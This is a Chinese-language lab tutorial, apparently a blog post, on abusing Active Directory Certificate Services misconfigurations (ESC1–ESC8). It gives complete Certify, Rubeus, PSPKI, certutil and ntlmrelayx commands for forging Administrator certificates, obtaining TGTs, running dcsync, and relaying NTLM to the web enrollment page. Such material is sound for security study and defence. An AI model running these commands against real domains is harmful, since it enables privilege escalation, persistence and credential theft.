## 前言

这一篇主要看下ADCS漏洞的利用，包括但不限于证书滥用，维权，提权等。内容主要还是基于白皮书以及网络上收集到的一些文章

## 证书申请

在上一篇我们讲到我们的机器如果在域内可以通过`certmgr.msc` 或通过 `certreq.exe`来进行证书的申请，但那实在是比较理想的情况，我们不一定能拥有对机器的GUI权限，因此在通过命令行进行证书申请时，我们可以使用白皮书配套的证书工具[Certify](https://github.com/GhostPack/Certify)

+ 搜索可用证书模板

  上一篇已经将我们需要的证书模板定向到了User/Machine上，这两个证书模板并非是一成不变的，通过Certify来搜索可用的证书模板

  ```
  Certify.exe find /clientauth
  ```

  ![image-20231228204328718](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228204328718.png)

+ 通过certify申请证书

  ```shell
  Certify.exe request /ca:ECHANGE2013.loser.com\loser-DC-CA /template:User
  
  # Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME
  #要使用request功能记得将dll文件放在该工具的同一目录下
  ```

  ![image-20231228205333908](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228205333908.png)

  申请后工具会提示你将该证书+私钥保存为pfx的格式

  这里有两点需要注意的地方：

  1.官方给出的演示将pem的文本粘贴到linux\MacOs上保存问pem文件再重新导入

  2.在生成pfx文件时如果要求输入密码，请不要输入

  ![image-20231228212214658](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20231228212214658.png)

  现在我们可以使用该证书去申请对应用户的TGT票据了

  ```
  Rubeus.exe asktgt /user:hacker /certificate:cert.pfx
  ```


![image-20240102201952926](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240102201952926.png)

```
Rubeus.exe asktgs /ticket:new.kirbi /service:cifs/ECHANGE2013.loser.com /dc:ECHANGE2013.loser.com /ptt
```

后续的工作，这个低权限的TGT对我们来说并没有什么作用。接下来介绍提权。

## 域权限提升

### 场景一

使用证书进行域提权条件比较苛刻，但这并非是不存在的，我们只需要利用管理员对模板的错误配置。

证书中的subjectAltName(SAN)用于指定证书使用者的身份，但通常这个字段值是直接从AD当中获取，如果证书在其AD对象的

mspki-certificate-name-flag属性中指定请求者是可以指定SAN，即CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT标志，则可以自定义SAN。

![image-20240104141943425](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104141943425.png)

如上图，证书模板开启这个选项，并且满足上篇文章所提的低权限注册，不需要审核等条件，我们就可以伪造管理员申请证书了。

搜索可用证书

```
Certify.exe find /vulnerable
```

![屏幕截图 2024-01-04 143655](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/屏幕截图 2024-01-04 143655.png)

通过指定SAN伪造Administrator申请证书

```
Certify.exe request /ca:ECHANGE2013.loser.com\loser-DC-CA /template:TESTMP /altname:LOSER\Administrator
```

转换并用来申请TGT

```
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx
```

![image-20240104144810306](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104144810306.png)

导入该票据后，我们就可以通过mimikatz进行dcsync

![image-20240104145739899](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104145739899.png)

### 场景二

与场景一类似，只是利用了扩展为任何目的和子CA。没有CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT标志，就无法向拟定SAN，但是这两个扩展本身来讲就比较危险。

攻击者可以将具有 Any Purpose EKU 的证书用于任何目的，这包括客户端身份验证、服务器身份验证、代码签名等。相比之下，攻击者可以使用 SubCA EKU 的证书用于任何目的也是如此，但也可以使用它来签署新证书。因此，使用 SubCA 证书，攻击者可以在新证书中指定任意 EKU 或字段。

如果 `TAuthCertificates` 对象不信任从属 CA（默认情况下不会信任），则攻击者无法创建可用于域身份验证的新证书。但是可以用来签发ADFS等服务，ADFS使用现有的 Active Directory 凭据提供 Web 登录

### 场景三

对于请求代理这个扩展的滥用，我们一共需要两组证书模板，一组定义了证书申请代理OID（1.3.6.1.4.1.311.20.2.1），可以代表其他主体申请其他证书模板，另一组需要允许低权限用户使用注册代理证书代表另一个用户来请求证书，并且该模板定义了一个允许域身份验证的 EKU。

![image-20240104160132560](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160132560.png)

![image-20240104160154104](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160154104.png)

![image-20240104160209178](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104160209178.png)

首先使用hacker注册一个TEST1的证书，并导出其包含私钥的证书。

```
Certify.exe request /ca:ECHANGE2013.loser.com\loser-DC-CA /template:TESTMP /altname:LOSER\Administrator
```

使用证书一代表administrator申请TEST2的证书

```
Certify.exe request /ca:"ECHANGE2013.loser.com\loser-DC-CA" /template:TEST2 /onbehalfof:LOSER\Administrator /enrollcert:cert.pfx
```

利用证书申请TGT

```
Rubeus.exe asktgt /user:Administrator /certificate:test2.pfx
```

![image-20240104161109991](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104161109991.png)

![image-20240104161159955](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104161159955.png)

成功导出hash

### 证书模板访问控制级别配置错误(ESC4)

证书模板是活动目录中的安全对象，对于域内的这些对象，通常都会关心对象的权限。如果攻击者对模板对象拥有 WriteProperty 权限，则其可以修改模板 AD 对象属性，则他们可以直接将错误配置推送到不易受攻击的模板，例如通过为允许域身份验证的模板在 `mspki-certificate-name-flag` 属性中启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志

通常我们关心以下权限

| 权限          | 描述                                       |
| ------------- | ------------------------------------------ |
| Owner         | 对象所有人，可以编辑任何属性               |
| Full Control  | 完全控制对象，可以编辑任何属性             |
| WriteOwner    | 允许委托人修改对象的安全描述符的所有者部分 |
| WriteDacl     | 可以修改访问控制                           |
| WriteProperty | 可以编辑任何属性                           |

一般这一点用来维持权限，一个普通域用户能写入模板的情况不常见

当我们接管整个域后，可以修改模板对象的属性

```
admod -b "CN=TESTMP,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=loser,DC=com" "msPKI-Certificate-Name-Flag::1"
```

![image-20240104205624548](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104205624548.png)

这里列举几个常用属性

- msPKI-Certificates-Name-Flag -edit-> ENROLLEE_SUPPLIES_SUBJECT (WriteProperty)
- msPKI-Certificate-Application-Policy -add-> 服务器身份验证 (WriteProperty)  <-即扩展策略的OID
- mspki-enrollment-flag -edit-> AUTO_ENROLLMENT (WriteProperty) ->模板的自动注册
- 直接修改模板的所有者

我们可以通过Certify的find命令枚举所有模板的访问控制条目

![image-20240104210937632](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240104210937632.png)

可以看的出来，模板默认是不会给普通用户写权限的，都是管理员组，这也是为什么我不认为这个方法属于提权，事实上访问控制权限通常都用于维权。

+ 至此提权到维权的思路基本上能够串起来了，即使用户的密码被修改，仍能通过PAC的机制获取用户的ntlm hash,遗憾的是我们不能直接使用hash来申请证书，不过通过pth，我们仍然能伪造该用户。

### PKI缺陷(ESC5)

如果低特权的攻击者可以对 `CN=Public Key Services,CN=Services,CN=Configuration,DC=,DC=` 控制，那么攻击者就会直接控制 PKI 系统 (证书模板容器、证书颁发机构容器、NTAuthCertificates对象、注册服务容器等)。

```
Certify.exe pkiobjects
```

![image-20240105164400145](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240105164400145.png)

hacker用户对该条目拥有完全控制权，通常来拥有创建子对象和写入权限应该就可以了。

有用这些权限，我们就可以创建一个恶意模板来进行提权或者维权了。

```powershell
Import-Module .\ADCSTemplate.psm1
Export-ADCSTemplate -DisplayName TESTMP > ./TESTTMP.json
New-ADCSTemplate -DisplayName TMP_BACK -JSON (Get-Content .\TESTTMP.json -Raw) -Publish -Identity "NT AUTHORITY\Authenticated Users"
```

![image-20240105170924555](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240105170924555.png)

### ESC6

CA 的 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志,当启用这个标志时，攻击者可以为任何域用户注册证书，这与ESC1比较相似，但ESC1是利用证书模板属性的SAN自定义，这里将SAN包含在名称值对当中。

这也属于错误配置的一种，要在域上启用这个标志，可以执行

```shell
certutil -config "ECHANGE2013.loser.com\loser-DC-CA" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2

//检查是否启用该标志，这仅通过远程注册表
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags 

certutil -config "ECHANGE2013.loser.com\loser-DC-CA" -getreg "policy\EditFlags" 
```

![image-20240108161144609](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108161144609.png)

通过certify也能达到同样的效果

![image-20240108161630768](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108161630768.png)

开启此标志只需要指定/altname即可有和ESC一样的效果。

注：由于安全更新，要使用ESC6则需要满足ESC10的情况，后续会介绍

+ 删除该标志

  ```
  certutil -config "CA_HOST\CA_NAME" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
  ```

### ESC7(CA访问权限配置错误)

CA自身有一套访问操作权限，可以通过GUI来查看。

如图所示

![image-20240108162348796](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108162348796.png)

主要关注颁发和管理证书(ManageCertificates)和管理CA(ManageCA)这两个权限，这两个权限分别对应证书管理员和CA管理员。

通过PSPKI模块可以枚举这些权限

```powershell
Import-Module -Name PSPKI
Get-CertificationAuthority -ComputerName ECHANGE2013.loser.com | Get-CertificationAuthorityAcl | select -expand Access
```

+ ManageCA

  这个权限主要的利用思路是添加EDITF_ATTRIBUTESUBJECTALTNAME2标志，并执行ESC2。通过PSPKI，我们能够远程开启该标志，具体命令如下

  ```powershell
  Import-Module PSPKI
  $ConfigReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "ECHANGE2013.loser.com"
  $ConfigReader.SetRootNode($true)
  $ConfigReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
  $ConfigReader.SetConfigEntry(1376590, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
  
  certutil -config "ECHANGE2013.loser.com\loser-DC-CA" -getreg "policy\EditFlags"
  ```

  ![image-20240108215753702](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108215753702.png)

  之后的流程就和ESC6相同了

+ ManageCertificates

  拥有该权限，能够对需要管理员审批的证书申请进行审批。

  如果当前用户拥有该权限，只需要记住请求的ID，即可

  ```
  Certify.exe request /ca:ECHANGE2013.loser.com\loser-DC-CA /template:ApprovalNeeded
  
  Import-Module PSPKI
  Get-CertificationAuthority -ComputerName ECHANGE2013.loser.com | Get-PendingRequest -RequestID 20 | Approve-CertificateRequest
  
  Certify.exe download /ca:ECHANGE2013.loser.com\loser-DC-CA /id:20
  ```

  ![image-20240108222020525](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108222020525.png)

  ![image-20240108222239700](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ldapp/image-20240108222239700.png)

### ESC8(NTLM Relay to AD CS HTTP Endpoints)

在安装AD CS服务时，如果勾选了web注册服务，就能利用这点进行NTLM Relay

+ 默认情况下web注册界面仅支持http,明确表明是通过ntlm进行验证。证书注册服务（CES）、证书注册策略（CEP）Web 服务和网络设备注册服务（NDES）默认支持通过其授权 HTTP 标头协商身份验证，协商身份验证支持 Kerberos 和 NTLM。同时这些服务支持https,但https在不与通道绑定结合时是不能防止ntlm relay的

> 关于为什么要relay到web界面？
>
> 通常ntlm relay只能进行一次身份验证。这导致会话的时间过短。此外，身份验证会话受到限制，攻击者无法与强制执行 NTLM 签名的服务交互。
>
> 如果是relay到web界面。攻击者可以访问web界面并为受害者申请证书，从而持续获取ntlm hash或者用于kerberos认证。这将获得一个较长时间的会话。

impacket里面的套件已经有了实现

```
python3 ntlmrelayx.py -t http://192.168.30.88/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# --adcs 启用 AD CS Relay 攻击
# --template指定 AD CS 证书模板
```

